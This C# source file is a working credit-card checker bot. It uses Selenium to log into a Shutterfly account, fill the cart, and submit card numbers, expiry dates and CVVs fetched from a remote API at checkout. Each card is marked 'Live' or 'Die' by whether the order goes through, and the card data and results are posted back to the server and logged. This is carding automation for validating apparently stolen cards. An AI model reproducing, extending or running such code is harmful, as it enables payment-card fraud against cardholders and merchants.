using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json.Linq;

namespace BetBasketBallChecker
{
    class CompareClass
    {
        protected enum CardType { Visa=1, Master=2};
        protected enum CheckResult{ Success = 1, Error = 2 };

        protected String[] m_cardList;

        protected InfoManage m_infoManage = new InfoManage();
        protected ChromeDriver driver;
        protected WebDriverWait load;
        protected IJavaScriptExecutor js;
        protected String m_userName = "";
        protected String m_password = "";
        protected Form1 m_wnd;
        protected Thread m_thread;
        protected int delayCount = 1000;
        protected List<Dictionary<string, string>> m_dataList = new List<Dictionary<string, string>>();
        public APIInterface m_interface = new APIInterface();

        public CompareClass(Form1 parent)
        {
            m_wnd = parent;
            initDriver();
        }

        public String getVersion()
        {
            return m_interface.getVersion();
        }

        public void Destroy()
        {
            if(m_thread != null)
                m_thread.Abort();
            driver.Close();
            driver.Dispose();
            driver.Quit();
        }

        protected void initDriver()
        {
            var driverService = ChromeDriverService.CreateDefaultService();
            ChromeOptions options = new ChromeOptions();
            driverService.HideCommandPromptWindow = true;
            options.AddArguments("--no-sandbox");
            options.AddArguments("disable-extensions");
            options.AddArguments("--start-maximized");

            driver = new ChromeDriver(driverService, options);

            js = (IJavaScriptExecutor)driver;

            load = new WebDriverWait(driver, TimeSpan.FromSeconds(100));
            load.IgnoreExceptionTypes(typeof(StaleElementReferenceException), typeof(InvalidElementStateException));
        }

        public void setUserName(String username)
        {
            m_userName = username;
        }

        public void setPassword(String password)
        {
            m_password = password;
        }

        public void setCardData(String inputData)
        {
            m_cardList = inputData.Split('\n');
        }

        public void Start(String cartUrl,string dataOptional="")
        {
            m_thread = new Thread(() =>
             {
                 try
                 {
                     startCompare(cartUrl, dataOptional);
                 } catch (Exception ex) {
                     log("error", "Start" + ex.Message);
                     Destroy();
                     initDriver();
                     m_wnd.endChecking();
                 }
             });
            m_thread.Start();
        }

        public void preExit()
        {
            try
            {
                List<Dictionary<string, string>> checkresult = new List<Dictionary<string, string>>();
                foreach (Dictionary<string, string> item in m_dataList)
                {
                    Dictionary<string, string> temp = new Dictionary<string, string>();
                    temp.Add("number", item["number"]);
                    temp.Add("status", "0");
                    temp.Add("country", "");
                    temp.Add("cvv", item["cvv"].Substring(0, 3));
                    temp.Add("family", "1");
                    checkresult.Add(temp);
                }
                if (m_interface.postCheckResult(checkresult))
                {
                    log("error", "Success post Result");
                }
                else
                {
                    log("error", "Failure post Result");
                }
                log("error", "New Version detected!!!!");
                Destroy();
                if (!File.Exists("exit.log"))
                {
                    var myFile = File.Create("exit.log");
                    myFile.Close();
                }
            }
            catch(Exception ex)
            {

            }
        }

        protected virtual void addCart(String cartUrl)
        {
            log("error", "Enter addCart");
            while (true)
            {
                try
                {
                    driver.Navigate().GoToUrl(cartUrl);
                    String count = driver.FindElementByXPath("//i[@id='cart-count-badge']").Text.Trim();
                    if (!count.Equals(""))
                    {
                        if (int.Parse(count) > 0)
                        {
                            driver.Navigate().GoToUrl("https://www.shutterfly.com/checkout/cart.sfly");
                            load.Until(ExpectedConditions.ElementExists(By.XPath("//button[@data-action='checkout']")));
                            var tmp = driver.FindElementByXPath("//button[@data-action='checkout']");
                            tmp.Click();
                            log("error", "Exist Cart");
                            return;
                        }
                    }

                    var personBtn = driver.FindElementByXPath("//button[text()='personalize']");
                    personBtn.Click();

                    personBtn = driver.FindElementByXPath("//a[@id='addToCartLink']");
                    while (!personBtn.Enabled) ;
                    personBtn.Click();
                    try
                    {
                        Thread.Sleep(1000);
                        personBtn = driver.FindElementByXPath("//a[@id='ErrorWarningsModalButton0']");
                        while (!personBtn.Enabled) ;
                        personBtn.Click();
                    }
                    catch (Exception ex)
                    {
                        log("error", "addCart 1" + ex.Message);
                    }
                    Thread.Sleep(1000);
                    inputTexttoElement("//input[@id='saveControlProjectName']", "My Cherry");
                    load.Until(ExpectedConditions.ElementExists(By.XPath("//a[@id='saveExistingModalButton1']")));
                    personBtn = driver.FindElementByXPath("//a[@id='saveExistingModalButton1']");
                    personBtn.Click();


                    load.Until(ExpectedConditions.ElementExists(By.XPath("//a[@id='continueToCartBtn']")));
                    personBtn = driver.FindElementByXPath("//a[@id='continueToCartBtn']");
                    while (!personBtn.Enabled) ;
                    personBtn.Click();

                    load.Until(ExpectedConditions.ElementExists(By.XPath("//button[@data-action='checkout']")));
                    personBtn = driver.FindElementByXPath("//button[@data-action='checkout']");
                    personBtn.Click();
                    log("error", "addCart Success!!");
                    return;
                }
                catch (Exception ex)
                {
                    log("error", "addCart" + ex.Message);
                    Thread.Sleep(5000);
                }
            }
            
        }
        protected virtual void login()
        {
            log("error", "Enter Login");
            driver.Navigate().GoToUrl("https://www.shutterfly.com/forwardingSignin/start.sfly");

            if (IsElementPresent(By.XPath("//a[@id='sf3-user-dropdown-trigger']")))
            {
                log("error", "Already Logined!!!");
                return;
            }

            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='userName' and contains(@class, 'signin_text_field')]")));
            var userId = driver.FindElementByXPath("//input[@id='userName' and contains(@class, 'signin_text_field')]");

            inputTexttoElement("//input[@id='userName' and contains(@class, 'signin_text_field')]",  m_userName);
            inputTexttoElement("//input[@id='password' and contains(@class, 'signin_text_field')]", m_password);

            var personBtn = driver.FindElementByXPath("//a[@id='signInButton']");
            while (!personBtn.Enabled) ;
            personBtn.Click();
            log("error", "Login Success!!");
        }

        protected virtual int checkOut(String cartUrl, String number, String month, String year, String cvv)
        {
            log("error", "Enter Checkout " + number);
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@name='cardNumber']")));
                inputTexttoElement("//input[@name='cardNumber']", number);
                Thread.Sleep(10);
                log("error", "Input CardNumber");
  

                driver.FindElementByXPath("//input[@name='monthExpires']").Click();
                load.Until(ExpectedConditions.ElementExists(By.XPath(String.Format("//ul[contains(@style, 'block')]/li[@data-value='{0}']", month))));
                driver.FindElementByXPath(String.Format("//ul[contains(@style, 'block')]/li[@data-value='{0}']", month)).Click();
                log("error", "Select Month");

                driver.FindElementByXPath("//input[@name='yearExpires']").Click();
                load.Until(ExpectedConditions.ElementExists(By.XPath(String.Format("//ul[contains(@style, 'block')]/li[@data-value='20{0}']", year))));
                driver.FindElementByXPath(String.Format("//ul[contains(@style, 'block')]/li[@data-value='20{0}']", year)).Click();
                log("error", "Select Year");

                inputTexttoElement("//input[@title='Please enter a CVV']", cvv);
                log("error", "Input CVV");
                Thread.Sleep(10);
                var personBtn = driver.FindElementByXPath("//button[@data-action='place-order']");Thread.Sleep(10);
                try
                {
                    js.ExecuteScript("arguments[0].scrollIntoView()", personBtn);
                }catch(Exception ex)
                { }
                personBtn.Click();
                log("error", "Click Place Order Button");
                if (!personBtn.GetAttribute("class").Contains("disabled")) return (int)CheckResult.Error;
                var loading = driver.FindElementByXPath("//div[@id='checkoutOrderStatusDialog']");
                var i = 0;
                try
                {
                    while (!loading.Displayed)
                    {
                        i++;
                        Thread.Sleep(20);
                        if (i > delayCount) break;
                    }
                }catch(Exception ex)
                {
                    log("error", "checkOut 1" + ex.Message);
                }
                
                i = 0;
                try
                {
                    while (loading.Displayed)
                    {
                        i++;
                        Thread.Sleep(20);
                        if (i > delayCount) break;
                    }
                }
                catch (Exception ex)
                {
                    log("error", "checkOut 2" + ex.Message);
                }
                log("error", "Click Place Order Response Arrived");
                if (driver.Url == "https://www.shutterfly.com/checkout/cart.sfly#checkout.sfly")
                {
                    load.Until(ExpectedConditions.ElementExists(By.XPath(String.Format("//li[@class='global-error']", year))));
                    var errBox = driver.FindElementByXPath("//li[@class='global-error']");
                    if (errBox.Displayed)
                    {
                        log("error", "Error Displayed");
                        return (int)CheckResult.Error;
                    }
                }
                else
                {
                    log("error", "Success Order");
                    return (int)CheckResult.Success;
                }
            }
            catch(Exception ex)
            {
                log("error", "checkOut last" + ex.Message);
                log("error", "During Checking card Error Occur.");
                login();
                addCart(cartUrl);
            }
            return (int)CheckResult.Error;
        }

        protected virtual void startCompare(String cartUrl,String data)
        {
            login();
            addCart(cartUrl);
            while(true)
            {
                try
                {
                    m_dataList = m_interface.getDataList(1);
                }catch(Exception ex)
                {
                   log("error", "m_interface.getDataList" + ex.Message);
                }
                if (m_dataList.Count < 1)
                {
                    log("error", "Data Length 0");
                    Thread.Sleep(20000);
                    continue;
                }
                List<Dictionary<string, string>> checkresult = new List<Dictionary<string, string>>();
                foreach (Dictionary<string, string> item in m_dataList)
                {
                    List<Dictionary<string, string>> temp1 = new List<Dictionary<string, string>>();
                    Dictionary<string, string> temp = new Dictionary<string, string>();
                    int ret = checkOut(cartUrl, item["number"], item["month"], item["year"], item["cvv"].Substring(0,3) );
                    if (ret == (int)CheckResult.Success)
                    {
                        addCart(cartUrl);
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live"));

                        int cardType = 1;
                        if (getCardType(item["number"]) == (int)CardType.Visa)
                        {
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Visa");
                        }
                        else
                        {
                            cardType = 2;
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Master");
                        }
                        temp.Add("number", item["number"]);
                        temp.Add("status", "8");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("country", "");
                        temp.Add("family", cardType.ToString());
                        temp1.Add(temp);
                        postResult(temp1);
                    }
                    else
                    {
                        log("error", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        temp.Add("number", item["number"]);
                        temp.Add("status", "2");
                        temp.Add("country", "");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("family", "0");
                        checkresult.Add(temp);
                    }
                }

                postResult(checkresult);
            }
        }

        protected void postResult(List<Dictionary<string, string>> checkresult)
        {
            try
            {
                if (m_interface.postCheckResult(checkresult))
                {
                    log("error", "Success post Result");
                }
                else
                {
                    log("error", "Failure post Result");
                    log("error", m_interface.m_errorResponse);
                }
            }
            catch (Exception ex)
            {
                log("error", "m_interface.postCheckResult" + ex.Message);
            }
        }

        protected int getCardType(String ccnumber)
        {
            string isVisa = "^4[0-9]{12}(?:[0-9]{3})?$";

            if (System.Text.RegularExpressions.Regex.IsMatch(ccnumber, isVisa))
            {
                // valid Visa card
                return (int)CardType.Visa;
            }
            return (int)CardType.Master;
        }

        protected bool IsElementPresent(By by)
        {
            try
            {
                driver.FindElement(by);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        protected void inputTexttoElement(String xpath, String value)
        {
            try
            {
                var item = driver.FindElementByXPath(xpath);
                item.Clear();
                item.SendKeys(value); 
            }
            catch (Exception ex)
            {
            }
        }
        public string Shuffle(string str)
        {
            char[] array = str.ToCharArray();
            Random rng = new Random();
            int n = array.Length;
            while (n > 1)
            {
                n--;
                int k = rng.Next(n + 1);
                var value = array[k];
                array[k] = array[n];
                array[n] = value;
            }
            return new string(array);
        }

        protected void log(String target, String text)
        {
            try
            {
                var now = DateTime.Now;
                var filename = now.ToShortDateString().Replace("/", "-") + "(" + target + ").log";
                if (!File.Exists(filename))
                {
                   var myFile  = File.Create(filename);
                    myFile.Close();
                }
                using (StreamWriter logFile = File.AppendText(filename))
                {
                    logFile.WriteLine(now.ToString() + ": " +  "---" + text);

                    m_wnd.writeLog(now.ToString() + ": " + "---" + text);

                    logFile.Flush();
                    logFile.Close();
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
}
